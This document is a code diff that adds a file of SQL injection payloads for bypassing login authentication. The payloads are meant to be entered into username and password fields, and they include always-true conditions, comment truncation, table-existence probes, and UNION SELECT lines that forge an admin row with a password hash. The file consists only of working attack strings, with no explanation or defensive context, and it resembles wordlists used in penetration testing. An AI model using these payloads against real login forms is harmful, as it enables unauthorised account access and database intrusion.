@@ -1,0 +1,31 @@
+# Authentication Bypass SQL Injection Payloads
+# Used in username/password fields of login forms
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1
+') OR ('1'='1'--
+admin'--
+admin' #
+admin'/*
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR 1=1--
+' OR 'x'='x
+' OR 'x'='x'--
+' OR 1=1 LIMIT 1--
+'OR 1=1--
+' OR ''='
+' OR ''=''--
+1' OR '1'='1
+1 OR 1=1--
+1 OR 1=1#
+anything' OR 'x'='x
+' OR username IS NOT NULL--
+' OR EXISTS(SELECT 1 FROM users)--
+' OR (SELECT COUNT(*) FROM users)>0--
+' UNION SELECT 1,'admin','admin','admin@x.com'--
+' AND 1=0 UNION SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'--
